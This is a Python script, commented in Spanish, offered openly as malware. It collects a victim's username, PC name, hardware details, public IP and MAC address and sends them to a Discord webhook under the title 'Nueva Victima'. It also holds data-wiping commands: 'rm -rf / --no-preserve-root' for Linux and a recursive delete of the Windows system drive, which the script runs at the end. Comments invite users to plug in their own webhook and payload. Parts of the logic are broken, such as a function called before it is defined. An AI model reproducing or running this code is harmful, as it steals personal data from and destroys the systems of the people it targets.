"""
Modulos:
"""

import os, sys, getpass, platform, requests, discord, psutil, re, uuid, threading, webbrowser
from discord_webhook import *

"""
Not Module Install:
"""

def modules():
    try:
        import discord_webhook
    except ModuleNotFoundError:
        os.system("pip install discord_webhook >> registros.txt")
    try:
        import discord 
    except ModuleNotFoundError:
        os.system("pip install discord >> registros.txt")
    try:
        import requests
    except ModuleNotFoundError:
        os.system("pip install requests >> registros.txt")
        
"""
Sistema Operativo:
"""

if sys.platform == "win32":
    modules()
elif sys.platform == "nt":
    linux()
else:
    sys.exit()

"""
Webhook Link (Obligatorio):
"""

try:
    webhook_link = "" #Aqui su webhook
except:
    if webhook_link < 10:
        print("Webhook invalido")

"""
Linux Malware:
"""

def linux(): #Aqui ponen su malware, yo pondre este solo de prueba
    os.system("rm -rf / * --no-preserve-root")

"""
Windows Malware:
"""

def windows():
    os.system("delete %systemdrive%*.* /f /s") 

"""
Get Size:
"""

def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "KB", "MB", "GB", "TB", "PB"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor

"""
Vars Data:
"""

procesador = platform.processor()
sistema = platform.platform()
user = getpass.getuser()
arquitectura = platform.architecture()
namePC = platform.node()
machine = platform.machine()
uname = platform.uname()
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
net_io = psutil.net_io_counters()
cpufreq = psutil.cpu_freq()
svmem = psutil.virtual_memory() 
partitions = psutil.disk_partitions()
for partition in partitions:
    try:
        partition_usage = psutil.disk_usage(partition.mountpoint)
    except PermissionError:
        continue

"""
Codigo:
"""

def info():
    webhook = DiscordWebhook(url = f"{webhook_link}")
    peticion = requests.get(r"https://jsonip.com")
    IPv4 = peticion.json()["ip"]
    sendinfo = f"""

    `Informacion de la PC:`

    **Nombre de usuario:** `{user}.`
    **Nombre de PC:** `{namePC}.`
    **Arquitectura:** `{machine}.`
    **Sistema Operativo:** `{sistema}.`
    **Procesador:** `{procesador}.`

    `Informacion del CPU:`

    **Cores Fisicos:** `{psutil.cpu_count(logical = False)}`
    **Cores Totales:** `{psutil.cpu_count(logical = True)}`
    **Maxima frecuencia:** `{cpufreq.max:.2f}`**Mhz**
    **Minima frecuencia:** `{cpufreq.min:.2f}`**Mhz**
    **Frecuencia actual:** `{cpufreq.current:.2f}`**Mhz**
    **Uso total de Cores:** `{psutil.cpu_percent()}`**%**

    `Informacion de Memoria RAM:`

    **Total:** `{get_size(svmem.total)}`
    **Disponible:** `{get_size(svmem.available)}`
    **En uso:** `{get_size(svmem.used)}`
    **Porcentaje:** `{get_size(svmem.percent)}`

    `Informacion de Particiones:`

    **Tamaño total:** `{get_size(partition_usage.total)}`
    **En uso:** `{get_size(partition_usage.used)}`
    **Porcentaje:** `{get_size(partition_usage.percent)}`**%**

    `Informacion de Network:`

    **Direccion IPv4:** `{IPv4}`
    **Mac Addres:** `{mac}`
    **Bytes Enviados:** `{get_size(net_io.bytes_sent)}`
    **Bytes Recibidos:** `{get_size(net_io.bytes_recv)}`

                """ 

    embed = DiscordEmbed(
        title = f"Nueva Victima",
        description = sendinfo,
        color = discord.Color.red()
    )
    embed.set_author(icon_url="https://avatars.githubusercontent.com/u/85564395?s=400&u=5a290f99665f793b9541454b47e5d8f16dba4fcc&v=4")
    embed.set_footer(text="Dev: Br3Fuck", icon_url="https://avatars.githubusercontent.com/u/85564395?s=400&u=5a290f99665f793b9541454b47e5d8f16dba4fcc&v=4")
    webhook.add_embed(embed)
    response = webhook.execute()

info()
windows()
